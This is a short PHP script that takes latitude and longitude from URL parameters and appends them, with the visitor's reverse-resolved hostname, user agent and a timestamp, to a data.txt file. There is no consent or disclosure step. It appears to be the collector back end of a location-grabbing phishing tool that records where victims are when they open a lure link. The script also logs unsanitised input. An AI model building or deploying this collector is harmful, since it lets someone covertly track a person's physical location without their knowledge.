<?php
date_default_timezone_set("Asia/Dhaka");
$myfile = fopen("data.txt", "a");
$txt = "Latitude: " . $_GET["lat"] . "\nLongitude: " . $_GET["lon"] . "\n" . "Host: " . gethostbyaddr($_SERVER["REMOTE_ADDR"]) . "\n" . "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n" . "Time: " . date("h:i:sa") . "\n";
fwrite($myfile, $txt);
fclose($myfile);

?>